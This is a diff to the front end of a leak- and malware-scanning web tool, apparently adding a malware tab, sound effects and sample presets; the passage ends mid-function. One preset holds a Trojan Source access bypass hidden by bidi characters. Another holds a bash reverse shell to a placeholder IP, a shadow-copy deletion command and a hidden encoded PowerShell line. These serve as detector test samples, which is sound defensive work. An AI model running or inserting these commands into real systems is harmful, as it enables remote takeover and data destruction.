@@ -846,6 +846,143 @@
       font-size: 0.85rem;
     }
 
+    /* Enclave Safety Quarantine Badge */
+    .enclave-badge {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 0.75rem;
+      background: rgba(0, 240, 255, 0.06);
+      border: 1px solid rgba(0, 240, 255, 0.22);
+      padding: 0.6rem 1rem;
+      border-radius: 8px;
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 0.73rem;
+      color: var(--cyan-bright);
+      margin-bottom: 1.25rem;
+      flex-wrap: wrap;
+    }
+
+    .enclave-badge.threat {
+      background: rgba(255, 0, 85, 0.08);
+      border-color: rgba(255, 0, 85, 0.35);
+      color: #ff99b8;
+    }
+
+    .enclave-badge-tag {
+      display: inline-flex;
+      align-items: center;
+      gap: 0.35rem;
+      background: rgba(0, 0, 0, 0.45);
+      padding: 0.2rem 0.55rem;
+      border-radius: 4px;
+      border: 1px solid rgba(255, 255, 255, 0.1);
+      font-size: 0.7rem;
+    }
+
+    /* Report Filter Tabs */
+    .report-tabs {
+      display: flex;
+      gap: 0.5rem;
+      flex-wrap: wrap;
+    }
+
+    .report-tab-btn {
+      background: rgba(255, 255, 255, 0.04);
+      border: 1px solid rgba(255, 255, 255, 0.1);
+      color: var(--text-muted);
+      font-family: 'Orbitron', monospace;
+      font-size: 0.72rem;
+      padding: 0.35rem 0.75rem;
+      border-radius: 6px;
+      cursor: pointer;
+      transition: all 0.2s;
+    }
+
+    .report-tab-btn:hover {
+      background: rgba(255, 255, 255, 0.08);
+      color: #fff;
+    }
+
+    .report-tab-btn.active {
+      background: rgba(0, 240, 255, 0.15);
+      color: var(--cyan-bright);
+      border-color: var(--border-cyan);
+      box-shadow: 0 0 10px rgba(0, 240, 255, 0.2);
+    }
+
+    .report-tab-btn .tab-count {
+      display: inline-block;
+      padding: 0.05rem 0.35rem;
+      background: rgba(0, 0, 0, 0.5);
+      border-radius: 10px;
+      font-size: 0.65rem;
+      margin-left: 0.25rem;
+      color: #fff;
+    }
+
+    /* Invisible Token Preview Chip */
+    .invisible-token {
+      display: inline-block;
+      background: rgba(255, 0, 85, 0.25);
+      color: #ff3377;
+      border: 1px dashed #ff0055;
+      padding: 0.05rem 0.35rem;
+      border-radius: 3px;
+      font-size: 0.7rem;
+      font-weight: bold;
+      letter-spacing: 0.05em;
+      margin: 0 0.15rem;
+    }
+
+    /* Diagnostics Grid */
+    .diagnostics-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+      gap: 1rem;
+      padding: 1rem 0;
+    }
+
+    .diag-card {
+      background: rgba(10, 16, 31, 0.7);
+      border: 1px solid rgba(0, 240, 255, 0.18);
+      border-radius: 10px;
+      padding: 1rem;
+    }
+
+    .diag-title {
+      font-family: 'Orbitron', monospace;
+      font-size: 0.75rem;
+      color: var(--cyan-bright);
+      margin-bottom: 0.5rem;
+      display: flex;
+      align-items: center;
+      gap: 0.4rem;
+    }
+
+    .diag-val {
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 0.8rem;
+      color: #e2e8f0;
+      line-height: 1.5;
+    }
+
+    .entropy-bar-bg {
+      width: 100%;
+      height: 8px;
+      background: rgba(255, 255, 255, 0.08);
+      border-radius: 4px;
+      overflow: hidden;
+      margin-top: 0.4rem;
+    }
+
+    .entropy-bar-fill {
+      height: 100%;
+      background: linear-gradient(90deg, var(--cyan-bright), var(--amber-warn), var(--crimson-threat));
+      width: 0%;
+      transition: width 0.5s ease;
+    }
+
     /* Keyframes */
     @keyframes alert-pulse {
       0%, 100% { opacity: 1; }
@@ -1456,7 +1593,7 @@
         <div class="brand-logo-hex"></div>
         <div class="brand-text">
           <h1>SENTINEL CORE</h1>
-          <span>Personal Data Leak Detector // Ray-Traced 3D Enclave</span>
+          <span>Personal Data Leak & Malware Detection Matrix // 3D Quarantine Enclave</span>
         </div>
       </div>
 
@@ -1466,7 +1603,16 @@
           <span id="dbStatus">MONGODB: STANDALONE ENGINE</span>
         </div>
         <button class="btn-preset" id="loadBreachBtn" title="Auto-populate mock high-entropy data leak sample">
-          <span>⚡</span> LOAD BREACH SAMPLE
+          <span>⚡</span> LEAK SAMPLE
+        </button>
+        <button class="btn-preset" id="loadInvisibleBtn" title="Auto-populate invisible zero-width unicode & Trojan Source code" style="border-color: rgba(0, 240, 255, 0.4); color: var(--cyan-bright);">
+          <span>👁️</span> INVISIBLE CODE
+        </button>
+        <button class="btn-preset" id="loadMalwareBtn" title="Auto-populate EICAR test signature and reverse shell exploit" style="border-color: rgba(255, 0, 85, 0.4); color: #ff4d88;">
+          <span>☣️</span> MALWARE SAMPLE
+        </button>
+        <button class="btn-preset" id="soundToggleBtn" title="Toggle cyber sound effects" style="border-color: rgba(0, 240, 255, 0.35); color: #a5f3fc;">
+          <span id="soundIcon">🔊</span> <span id="soundText">AUDIO: ON</span>
         </button>
       </div>
     </header>
@@ -1481,22 +1627,22 @@
         <div class="metric-sub" id="threatSub">Zero Compromised Credentials</div>
       </div>
 
-      <div class="metric-card">
-        <div class="metric-label">Detected PII Leaks</div>
+      <div class="metric-card" id="cardMalware">
+        <div class="metric-label">Malware & Invisible Code</div>
+        <div class="metric-value" id="malwareCountVal" style="color: var(--cyan-bright);">0</div>
+        <div class="metric-sub" id="malwareSub">Zero Threats Detected</div>
+      </div>
+
+      <div class="metric-card" id="cardLeaks">
+        <div class="metric-label">Sensitive Data Leaks</div>
         <div class="metric-value" id="leakCountVal">0</div>
-        <div class="metric-sub">Total Matches in Payload</div>
+        <div class="metric-sub" id="leakSub">PII, Tokens & Keys</div>
       </div>
 
-      <div class="metric-card">
-        <div class="metric-label">Critical Entropy Keys</div>
-        <div class="metric-value" id="critCountVal">0</div>
-        <div class="metric-sub">Tokens, Cards, Secrets</div>
-      </div>
-
-      <div class="metric-card">
-        <div class="metric-label">Shield Integrity</div>
-        <div class="metric-value" id="shieldIntegrityVal" style="color: var(--cyan-bright);">100%</div>
-        <div class="metric-sub">Real-Time Pattern Coverage</div>
+      <div class="metric-card" id="cardShield">
+        <div class="metric-label">Safe Quarantine Enclave</div>
+        <div class="metric-value" id="shieldIntegrityVal" style="color: var(--emerald-safe);">100%</div>
+        <div class="metric-sub">Zero-Execution Memory Sandbox</div>
       </div>
     </section>
 
@@ -1528,35 +1674,37 @@
       <div class="scanner-panel">
         <div class="panel-tabs">
           <button class="tab-btn active" id="tabTextBtn">RAW PAYLOAD / LOGS</button>
-          <button class="tab-btn" id="tabFileBtn">DOCUMENT UPLOAD (PDF, WORD, EXCEL...)</button>
+          <button class="tab-btn" id="tabFileBtn">FILE UPLOAD (DOCUMENT, CODE, BINARY...)</button>
         </div>
 
         <div class="tab-content" id="tabTextContent">
-          <textarea class="raw-textarea" id="textInput" placeholder="// Paste logs, database dumps, source files, or credentials here to audit for leaks...
-// Example: user emails, phone numbers, SSNs, AWS tokens, credit cards."></textarea>
+          <textarea class="raw-textarea" id="textInput" placeholder="// Paste logs, database dumps, source files, or code here to inspect for:
+// 1. Invisible malicious zero-width code & Trojan Source Bidi overrides
+// 2. Shell droppers, reverse shells, wiper payloads & malware signatures
+// 3. Sensitive PII, credit cards, AWS tokens, private keys & credentials..."></textarea>
         </div>
 
         <div class="tab-content" id="tabFileContent" style="display: none;">
           <div class="file-dropzone" id="dropzone">
-            <div class="dropzone-icon">📑</div>
-            <div class="dropzone-label">DRAG & DROP ANY DOCUMENT OR FILE</div>
-            <div class="dropzone-sub">Deep text extraction & leak audit across documents and streams</div>
+            <div class="dropzone-icon">🛡️</div>
+            <div class="dropzone-label">DRAG & DROP ANY FILE TO AUDIT FOR MALWARE & LEAKS</div>
+            <div class="dropzone-sub">Deep inspection for invisible code, embedded macros, exploits & data leaks</div>
             <div class="file-format-tags">
               <span class="format-tag">📕 PDF (.pdf)</span>
-              <span class="format-tag">📘 Word (.docx, .doc)</span>
-              <span class="format-tag">📗 Excel (.xlsx, .csv)</span>
+              <span class="format-tag">📘 Word (.docx, .docm)</span>
+              <span class="format-tag">📗 Excel (.xlsx, .xlsm)</span>
               <span class="format-tag">📑 RTF (.rtf)</span>
-              <span class="format-tag">📊 JSON / CSV</span>
-              <span class="format-tag">⚙️ LOG / ENV / Code</span>
+              <span class="format-tag">💻 Code (.py, .js, .sh, .ps1)</span>
+              <span class="format-tag">📦 Binaries & Archives (.zip, .exe)</span>
             </div>
-            <input type="file" id="fileInput" accept=".pdf,.docx,.doc,.xlsx,.xls,.csv,.tsv,.rtf,.txt,.log,.json,.env,.yaml,.yml,.xml,.md,text/*" style="display: none;">
+            <input type="file" id="fileInput" accept="*/*" style="display: none;">
           </div>
           <div id="selectedFileName" style="margin-top: 0.6rem; font-family: 'JetBrains Mono', monospace; font-size: 0.75rem; color: var(--cyan-bright); text-align: center;"></div>
         </div>
 
         <div class="terminal-actions">
           <button class="btn-audit" id="auditBtn">
-            <span>⚡</span> RUN LEAK AUDIT
+            <span>⚡</span> RUN SECURITY AUDIT & MALWARE SCAN
           </button>
           <button class="btn-clear" id="clearBtn">PURGE</button>
         </div>
@@ -1575,35 +1723,90 @@
       <button class="banner-action-btn" id="exportBtn">EXPORT AUDIT REPORT</button>
     </div>
 
-    <!-- Data Leak Findings Table -->
+    <!-- Security & Leak Audit Findings Section -->
     <section class="report-panel" id="reportPanel">
+      <!-- Enclave Guarantee Banner -->
+      <div class="enclave-badge" id="enclaveBadge">
+        <div style="display: flex; align-items: center; gap: 0.5rem;">
+          <span>🛡️</span>
+          <span><strong>SAFE IN-MEMORY QUARANTINE ACTIVE:</strong> File analyzed in shielded memory. Zero host execution policy enforced.</span>
+        </div>
+        <div style="display: flex; gap: 0.5rem;">
+          <span class="enclave-badge-tag">HOST: ISOLATED</span>
+          <span class="enclave-badge-tag" id="entropyTag">ENTROPY: 0.00</span>
+        </div>
+      </div>
+
       <div class="report-top">
         <div style="display: flex; align-items: center; gap: 1rem; flex-wrap: wrap;">
-          <div class="report-title">DETECTION TELEMETRY LOGS</div>
+          <div class="report-title">TELEMETRY & FORENSIC AUDIT LOGS</div>
           <div id="docPillContainer"></div>
         </div>
         <div class="metric-sub" id="scanTimestamp">SYSTEM STANDBY</div>
       </div>
 
-      <div class="table-container">
+      <!-- Report Filter Tabs -->
+      <div class="report-tabs" style="margin-bottom: 1rem;">
+        <button class="report-tab-btn active" id="filterAllBtn">ALL FINDINGS <span class="tab-count" id="countAllBadge">0</span></button>
+        <button class="report-tab-btn" id="filterMalwareBtn">☣️ MALWARE & INVISIBLE CODE <span class="tab-count" id="countMalwareBadge">0</span></button>
+        <button class="report-tab-btn" id="filterLeaksBtn">🔑 DATA LEAKS & SECRETS <span class="tab-count" id="countLeaksBadge">0</span></button>
+        <button class="report-tab-btn" id="filterDiagnosticsBtn">🔬 ENCLAVE DIAGNOSTICS</button>
+      </div>
+
+      <!-- Table View -->
+      <div class="table-container" id="findingsTableContainer">
         <table class="data-table">
           <thead>
             <tr>
-              <th style="width: 100px;">SEVERITY</th>
-              <th style="width: 160px;">CLASSIFICATION</th>
-              <th style="width: 170px;">DOCUMENT LOCATION</th>
-              <th>EXPOSURE & CONTEXT SNIPPET</th>
-              <th style="width: 280px;">RISK & RECOMMENDATION</th>
+              <th style="width: 105px;">SEVERITY</th>
+              <th style="width: 220px;">THREAT / CLASSIFICATION</th>
+              <th style="width: 175px;">LOCATION / OFFSET</th>
+              <th>EXPOSURE & FORENSIC EVIDENCE</th>
+              <th style="width: 280px;">RISK & REMEDIATION</th>
             </tr>
           </thead>
           <tbody id="findingsBody">
             <tr>
               <td colspan="5" class="empty-state">
-                Awaiting payload ingestion. Upload any PDF, Word, Excel, or text document, or paste raw text and click "RUN LEAK AUDIT".
+                Awaiting payload ingestion. Upload any PDF, Word, Excel, script or binary, or paste text and click "RUN SECURITY AUDIT".
               </td>
             </tr>
           </tbody>
         </table>
+      </div>
+
+      <!-- Diagnostics View (Hidden by default) -->
+      <div id="diagnosticsContainer" style="display: none;">
+        <div class="diagnostics-grid">
+          <div class="diag-card">
+            <div class="diag-title"><span>🛡️</span> SYSTEM SAFETY ENCLAVE</div>
+            <div class="diag-val" id="diagSafety">
+              • In-Memory Quarantine: <strong>ENABLED</strong><br>
+              • Zero Execution Policy: <strong>ACTIVE</strong><br>
+              • Host Subprocess Invocation: <strong>BLOCKED</strong><br>
+              • Path Traversal Sanitation: <strong>PASSED</strong>
+            </div>
+          </div>
+          <div class="diag-card">
+            <div class="diag-title"><span>📊</span> SHANNON ENTROPY METER</div>
+            <div class="diag-val">
+              Entropy: <strong id="diagEntropyVal">0.00</strong> / 8.00<br>
+              <span id="diagEntropyNote" style="color: var(--text-muted); font-size: 0.72rem;">Normal text / code stream</span>
+              <div class="entropy-bar-bg">
+                <div class="entropy-bar-fill" id="diagEntropyBar"></div>
+              </div>
+            </div>
+          </div>
+          <div class="diag-card">
+            <div class="diag-title"><span>💣</span> DECOMPRESSION BOMB SHIELD</div>
+            <div class="diag-val" id="diagBomb">
+              • Max Uncompressed Quota: <strong>60 MB</strong><br>
+              • Max Compression Ratio: <strong>100:1</strong><br>
+              • Nested Zip Recursion Cap: <strong>SAFE</strong><br>
+              • Memory Exhaustion Defense: <strong>ACTIVE</strong>
+            </div>
+          </div>
+        </div>
       </div>
     </section>
   </div>
@@ -1613,12 +1816,17 @@
     let scene, camera, renderer, shieldGroup, particles, wireframeShield;
     let scanLaserWave;
     let targetRotationX = 0, targetRotationY = 0;
-    let currentFindings = [];
 
     function initThreeScene() {
+      if (typeof THREE === 'undefined') {
+        console.warn('Three.js library is loading. Retrying 3D matrix initialization in 200ms...');
+        setTimeout(initThreeScene, 200);
+        return;
+      }
       const container = document.getElementById('threeCanvasContainer');
-      const width = container.clientWidth;
-      const height = container.clientHeight;
+      if (!container) return;
+      const width = container.clientWidth || 500;
+      const height = container.clientHeight || 450;
 
       scene = new THREE.Scene();
       camera = new THREE.PerspectiveCamera(45, width / height, 0.1, 1000);
@@ -1794,6 +2002,8 @@
       }
 
       animate();
+      setTimeout(handleThreeResize, 100);
+      setTimeout(handleThreeResize, 400);
     }
 
     let scanPulseActive = false;
@@ -1848,7 +2058,126 @@
       renderer.render(scene, camera);
     }
 
-    // Tab switching
+    // ==========================================
+    // SENTINEL WEB AUDIO SYNTHESIS ENGINE
+    // Real-time zero-latency procedural sound effects
+    // ==========================================
+    class SentinelAudioEngine {
+      constructor() {
+        this.ctx = null;
+        this.enabled = true;
+      }
+
+      init() {
+        if (!this.ctx) {
+          const AudioContextClass = window.AudioContext || window.webkitAudioContext;
+          if (AudioContextClass) {
+            this.ctx = new AudioContextClass();
+          }
+        }
+        if (this.ctx && this.ctx.state === 'suspended') {
+          this.ctx.resume();
+        }
+      }
+
+      // UI Click / Switch Chirp
+      playClick() {
+        if (!this.enabled) return;
+        this.init();
+        if (!this.ctx) return;
+        try {
+          const osc = this.ctx.createOscillator();
+          const gain = this.ctx.createGain();
+          osc.type = 'sine';
+          osc.frequency.setValueAtTime(800, this.ctx.currentTime);
+          osc.frequency.exponentialRampToValueAtTime(1400, this.ctx.currentTime + 0.04);
+          gain.gain.setValueAtTime(0.04, this.ctx.currentTime);
+          gain.gain.exponentialRampToValueAtTime(0.001, this.ctx.currentTime + 0.04);
+          osc.connect(gain);
+          gain.connect(this.ctx.destination);
+          osc.start();
+          osc.stop(this.ctx.currentTime + 0.04);
+        } catch (e) {}
+      }
+
+      // Radar sweep wave when audit begins
+      playScanWave() {
+        if (!this.enabled) return;
+        this.init();
+        if (!this.ctx) return;
+        try {
+          const osc = this.ctx.createOscillator();
+          const gain = this.ctx.createGain();
+          osc.type = 'sawtooth';
+          osc.frequency.setValueAtTime(260, this.ctx.currentTime);
+          osc.frequency.exponentialRampToValueAtTime(950, this.ctx.currentTime + 0.35);
+          gain.gain.setValueAtTime(0.06, this.ctx.currentTime);
+          gain.gain.linearRampToValueAtTime(0.09, this.ctx.currentTime + 0.15);
+          gain.gain.exponentialRampToValueAtTime(0.001, this.ctx.currentTime + 0.35);
+          osc.connect(gain);
+          gain.connect(this.ctx.destination);
+          osc.start();
+          osc.stop(this.ctx.currentTime + 0.35);
+        } catch (e) {}
+      }
+
+      // Harmonic chime when payload is clean / fortified
+      playCleanChime() {
+        if (!this.enabled) return;
+        this.init();
+        if (!this.ctx) return;
+        try {
+          const notes = [523.25, 659.25, 783.99, 1046.50]; // C5, E5, G5, C6
+          notes.forEach((freq, idx) => {
+            const osc = this.ctx.createOscillator();
+            const gain = this.ctx.createGain();
+            osc.type = 'sine';
+            const startTime = this.ctx.currentTime + idx * 0.08;
+            osc.frequency.setValueAtTime(freq, startTime);
+            gain.gain.setValueAtTime(0, startTime);
+            gain.gain.linearRampToValueAtTime(0.06, startTime + 0.02);
+            gain.gain.exponentialRampToValueAtTime(0.001, startTime + 0.35);
+            osc.connect(gain);
+            gain.connect(this.ctx.destination);
+            osc.start(startTime);
+            osc.stop(startTime + 0.35);
+          });
+        } catch (e) {}
+      }
+
+      // Critical Threat Siren / Double Pulse Alarm
+      playThreatAlarm() {
+        if (!this.enabled) return;
+        this.init();
+        if (!this.ctx) return;
+        try {
+          [0, 0.22, 0.44].forEach((delay) => {
+            const osc = this.ctx.createOscillator();
+            const gain = this.ctx.createGain();
+            osc.type = 'sawtooth';
+            const startTime = this.ctx.currentTime + delay;
+            osc.frequency.setValueAtTime(520, startTime);
+            osc.frequency.exponentialRampToValueAtTime(180, startTime + 0.18);
+            gain.gain.setValueAtTime(0.12, startTime);
+            gain.gain.exponentialRampToValueAtTime(0.001, startTime + 0.18);
+            osc.connect(gain);
+            gain.connect(this.ctx.destination);
+            osc.start(startTime);
+            osc.stop(startTime + 0.18);
+          });
+        } catch (e) {}
+      }
+    }
+
+    const audioEngine = new SentinelAudioEngine();
+
+    // State collections
+    let currentFindings = [];
+    let currentMalwareFindings = [];
+    let currentLeakFindings = [];
+    let currentActiveFilter = 'all';
+
+    // Tab switching & Controls
     const tabTextBtn = document.getElementById('tabTextBtn');
     const tabFileBtn = document.getElementById('tabFileBtn');
     const tabTextContent = document.getElementById('tabTextContent');
@@ -1860,12 +2189,42 @@
     const auditBtn = document.getElementById('auditBtn');
     const clearBtn = document.getElementById('clearBtn');
     const loadBreachBtn = document.getElementById('loadBreachBtn');
+    const loadInvisibleBtn = document.getElementById('loadInvisibleBtn');
+    const loadMalwareBtn = document.getElementById('loadMalwareBtn');
+    const soundToggleBtn = document.getElementById('soundToggleBtn');
     const exportBtn = document.getElementById('exportBtn');
+
+    // Filter Buttons
+    const filterAllBtn = document.getElementById('filterAllBtn');
+    const filterMalwareBtn = document.getElementById('filterMalwareBtn');
+    const filterLeaksBtn = document.getElementById('filterLeaksBtn');
+    const filterDiagnosticsBtn = document.getElementById('filterDiagnosticsBtn');
+    const findingsTableContainer = document.getElementById('findingsTableContainer');
+    const diagnosticsContainer = document.getElementById('diagnosticsContainer');
 
     let activeTab = 'text';
     let uploadedFile = null;
 
+    if (soundToggleBtn) {
+      soundToggleBtn.addEventListener('click', () => {
+        audioEngine.enabled = !audioEngine.enabled;
+        const icon = document.getElementById('soundIcon');
+        const text = document.getElementById('soundText');
+        if (audioEngine.enabled) {
+          if (icon) icon.textContent = '🔊';
+          if (text) text.textContent = 'AUDIO: ON';
+          soundToggleBtn.style.color = '#a5f3fc';
+          audioEngine.playClick();
+        } else {
+          if (icon) icon.textContent = '🔇';
+          if (text) text.textContent = 'AUDIO: OFF';
+          soundToggleBtn.style.color = 'var(--text-muted)';
+        }
+      });
+    }
+
     tabTextBtn.addEventListener('click', () => {
+      audioEngine.playClick();
       activeTab = 'text';
       tabTextBtn.classList.add('active');
       tabFileBtn.classList.remove('active');
@@ -1874,6 +2233,7 @@
     });
 
     tabFileBtn.addEventListener('click', () => {
+      audioEngine.playClick();
       activeTab = 'file';
       tabFileBtn.classList.add('active');
       tabTextBtn.classList.remove('active');
@@ -1902,23 +2262,26 @@
     function getFileBadge(filename) {
       const ext = (filename || '').split('.').pop().toLowerCase();
       if (ext === 'pdf') return '📕 PDF Document';
-      if (['docx', 'doc'].includes(ext)) return '📘 Word Document';
-      if (['xlsx', 'xls', 'csv'].includes(ext)) return '📗 Spreadsheet';
+      if (['docx', 'doc', 'docm'].includes(ext)) return '📘 Word Document';
+      if (['xlsx', 'xls', 'xlsm', 'csv'].includes(ext)) return '📗 Spreadsheet';
       if (ext === 'rtf') return '📑 Rich Text Document';
-      if (['json', 'log', 'env', 'txt'].includes(ext)) return '📄 Text / Config';
-      return '📦 Document File';
+      if (['py', 'js', 'sh', 'ps1', 'bat', 'cmd'].includes(ext)) return '💻 Script Source';
+      if (['exe', 'bin', 'dll', 'so', 'dylib'].includes(ext)) return '⚙️ Binary Executable';
+      if (['zip', 'tar', 'gz', '7z'].includes(ext)) return '📦 Archive Container';
+      return '📄 Document / Stream';
     }
 
     function handleFileSelect(file) {
       uploadedFile = file;
       const badge = getFileBadge(file.name);
-      selectedFileName.innerHTML = `<span class="doc-pill">${badge}</span> <strong>${file.name}</strong> <span style="color: var(--text-muted);">(${(file.size / 1024).toFixed(1)} KB) — Ready to Inspect</span>`;
+      selectedFileName.innerHTML = `<span class="doc-pill">${badge}</span> <strong>${file.name}</strong> <span style="color: var(--text-muted);">(${(file.size / 1024).toFixed(1)} KB) — In-Memory Quarantine Ready</span>`;
     }
 
-    // Preset Breach Sample (Showcase "Critical Risk" state in 1 click!)
+    // Preset 1: Sensitive Data Leak Sample
     loadBreachBtn.addEventListener('click', () => {
+      audioEngine.playClick();
       tabTextBtn.click();
-      textInput.value = `[PRODUCTION_AUDIT_LOG - 2026-09-23]
+      textInput.value = `[FINANCIAL_AUDIT_LOG - 2026-11-09]
 User: alex.turner@enterprise-cloud.io connected from IPv4: 198.51.100.42
 Billing Card on File: 4532-0150-1234-5671 (Luhn Valid Visa)
 Contact Verification Phone: +1 (555) 438-9201
@@ -1929,7 +2292,45 @@ System Auth Bearer: bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.s6d8f7`;
       executeScan();
     });
 
+    // Preset 2: Invisible Malicious Code & Trojan Source (CVE-2021-42574)
+    loadInvisibleBtn.addEventListener('click', () => {
+      audioEngine.playClick();
+      tabTextBtn.click();
+      textInput.value = `// SECURE ACCESS CONTROL MODULE (INSPECTION SAMPLE)
+const roles = ["user", "auditor"];
+
+function checkUserAccess(user) {
+    let isAdmin = false;
+    /*\u202E } \u2066if (isAdmin)\u2069 \u2066*/ return true;
+    return false;
+}
+
+// Steganography Test Payload:
+const tokenConfig = "AUTH_KEY_VERIFIED\u200B\u200C\u200B\u200D\u200B\u200C\u200B\u200C\u200D\u200B\u200C\u200B\u200D\u200D\u200B_ACTIVE";
+console.log("Access status:", checkUserAccess({ role: "guest" }));`;
+      executeScan();
+    });
+
+    // Preset 3: Malware Exploit Vector (EICAR + Reverse Shell + Ransomware Command)
+    loadMalwareBtn.addEventListener('click', () => {
+      audioEngine.playClick();
+      tabTextBtn.click();
+      textInput.value = `#!/bin/bash
+# DEPLOYMENT DEVOPS UTILITY (MALWARE VECTOR SAMPLE)
+# Test 1: Industry Standard Anti-Virus Verification String
+X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*
+
+# Test 2: Reverse Shell C2 Connection
+bash -i >& /dev/tcp/198.51.100.23/4444 0>&1
+
+# Test 3: Ransomware Shadow Copy Destruction Command
+vssadmin.exe delete shadows /all /quiet
+powershell.exe -nop -w hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA`;
+      executeScan();
+    });
+
     clearBtn.addEventListener('click', () => {
+      audioEngine.playClick();
       textInput.value = '';
       uploadedFile = null;
       selectedFileName.textContent = '';
@@ -1939,20 +2340,54 @@ System Auth Bearer: bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.s6d8f7`;
 
     auditBtn.addEventListener('click', executeScan);
 
+    // Report Filtering Controls
+    function setReportFilter(filterType) {
+      currentActiveFilter = filterType;
+      audioEngine.playClick();
+      [filterAllBtn, filterMalwareBtn, filterLeaksBtn, filterDiagnosticsBtn].forEach(b => b.classList.remove('active'));
+
+      if (filterType === 'diagnostics') {
+        filterDiagnosticsBtn.classList.add('active');
+        findingsTableContainer.style.display = 'none';
+        diagnosticsContainer.style.display = 'block';
+        return;
+      }
+
+      findingsTableContainer.style.display = 'block';
+      diagnosticsContainer.style.display = 'none';
+
+      if (filterType === 'all') {
+        filterAllBtn.classList.add('active');
+        renderFindingsTable(currentFindings);
+      } else if (filterType === 'malware') {
+        filterMalwareBtn.classList.add('active');
+        renderFindingsTable(currentMalwareFindings);
+      } else if (filterType === 'leaks') {
+        filterLeaksBtn.classList.add('active');
+        renderFindingsTable(currentLeakFindings);
+      }
+    }
+
+    filterAllBtn.addEventListener('click', () => setReportFilter('all'));
+    filterMalwareBtn.addEventListener('click', () => setReportFilter('malware'));
+    filterLeaksBtn.addEventListener('click', () => setReportFilter('leaks'));
+    filterDiagnosticsBtn.addEventListener('click', () => setReportFilter('diagnostics'));
+
     async function executeScan() {
       const textVal = textInput.value.trim();
       if (activeTab === 'text' && !textVal) {
-        alert('Please enter payload logs or load the breach sample.');
+        alert('Please enter payload logs or click a sample preset button.');
         return;
       }
       if (activeTab === 'file' && !uploadedFile) {
-        alert('Please select or drop a document to inspect.');
+        alert('Please select or drop a document/binary file to inspect.');
         return;
       }
 
       auditBtn.disabled = true;
-      auditBtn.innerHTML = '<span>⚡</span> AUDITING DOCUMENT STREAM...';
+      auditBtn.innerHTML = '<span>⚡</span> AUDITING QUARANTINED STREAM...';
       triggerScanWave(false);
+      audioEngine.playScanWave();
 
       const formData = new FormData();
       if (activeTab === 'file' && uploadedFile) {
@@ -1972,22 +2407,79 @@ System Auth Bearer: bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.s6d8f7`;
         alert('Audit query failed. Verify backend service status.');
       } finally {
         auditBtn.disabled = false;
-        auditBtn.innerHTML = '<span>⚡</span> RUN LEAK AUDIT';
+        auditBtn.innerHTML = '<span>⚡</span> RUN SECURITY AUDIT & MALWARE SCAN';
       }
     }
 
     function renderAuditReport(data) {
-      currentFindings = data.findings || [];
-      const count = currentFindings.length;
-      const critCount = (data.severity_summary && data.severity_summary.critical) || currentFindings.filter(f => f.severity === 'Critical').length;
-      const highCount = (data.severity_summary && data.severity_summary.high) || currentFindings.filter(f => f.severity === 'High').length;
-      const highEntropyCount = critCount + highCount;
+      currentMalwareFindings = data.malware_findings || [];
+      currentLeakFindings = data.leak_findings || [];
+      currentFindings = [...currentMalwareFindings, ...currentLeakFindings];
 
-      document.getElementById('leakCountVal').textContent = count;
-      document.getElementById('critCountVal').textContent = highEntropyCount;
+      const malwareCount = currentMalwareFindings.length;
+      const leakCount = currentLeakFindings.length;
+      const totalCount = currentFindings.length;
 
+      // Update Filter Badges
+      document.getElementById('countAllBadge').textContent = totalCount;
+      document.getElementById('countMalwareBadge').textContent = malwareCount;
+      document.getElementById('countLeaksBadge').textContent = leakCount;
+
+      // Update HUD Metrics
+      const malwareCrit = currentMalwareFindings.filter(f => f.severity === 'Critical').length;
+      const leakCrit = currentLeakFindings.filter(f => f.severity === 'Critical').length;
+      const totalCrit = malwareCrit + leakCrit;
+
+      const malwareValEl = document.getElementById('malwareCountVal');
+      const malwareSubEl = document.getElementById('malwareSub');
+      if (malwareCount > 0) {
+        malwareValEl.textContent = `${malwareCount} THREAT${malwareCount !== 1 ? 'S' : ''}`;
+        malwareValEl.style.color = malwareCrit > 0 ? 'var(--crimson-threat)' : 'var(--amber-warn)';
+        malwareSubEl.textContent = malwareCrit > 0 ? 'Critical Exploit / Malicious Payload' : 'Suspicious Code / Concealment';
+        document.getElementById('cardMalware').classList.add('threat');
+      } else {
+        malwareValEl.textContent = '0 CLEAN';
+        malwareValEl.style.color = 'var(--emerald-safe)';
+        malwareSubEl.textContent = 'Zero Malware / Invisible Code';
+        document.getElementById('cardMalware').classList.remove('threat');
+      }
+
+      const leakValEl = document.getElementById('leakCountVal');
+      const leakSubEl = document.getElementById('leakSub');
+      if (leakCount > 0) {
+        leakValEl.textContent = `${leakCount} LEAK${leakCount !== 1 ? 'S' : ''}`;
+        leakValEl.style.color = leakCrit > 0 ? 'var(--crimson-threat)' : 'var(--amber-warn)';
+        leakSubEl.textContent = `${leakCrit} Critical High-Entropy Keys`;
+        document.getElementById('cardLeaks').classList.add('threat');
+      } else {
+        leakValEl.textContent = '0';
+        leakValEl.style.color = '#fff';
+        leakSubEl.textContent = 'Zero Compromised Credentials';
+        document.getElementById('cardLeaks').classList.remove('threat');
+      }
+
+      // Safe Enclave Badge
+      const entropy = data.entropy || 0.0;
+      document.getElementById('entropyTag').textContent = `ENTROPY: ${entropy.toFixed(2)}`;
+      document.getElementById('diagEntropyVal').textContent = entropy.toFixed(2);
+      const entropyPercent = Math.min(100, (entropy / 8.0) * 100);
+      document.getElementById('diagEntropyBar').style.width = `${entropyPercent}%`;
+      const entropyNote = document.getElementById('diagEntropyNote');
+      if (entropy > 7.4) {
+        entropyNote.textContent = '⚠️ Anomalous high entropy (Likely packed, obfuscated, or encrypted malware)';
+        entropyNote.style.color = 'var(--crimson-threat)';
+      } else if (entropy > 5.5) {
+        entropyNote.textContent = 'Compressed or compiled structured stream';
+        entropyNote.style.color = 'var(--amber-warn)';
+      } else {
+        entropyNote.textContent = 'Normal plain text / source code stream';
+        entropyNote.style.color = 'var(--emerald-safe)';
+      }
+
+      // Timestamp & Source
       const chars = data.extracted_chars ? ` // EXTRACTED: ${data.extracted_chars.toLocaleString()} chars` : '';
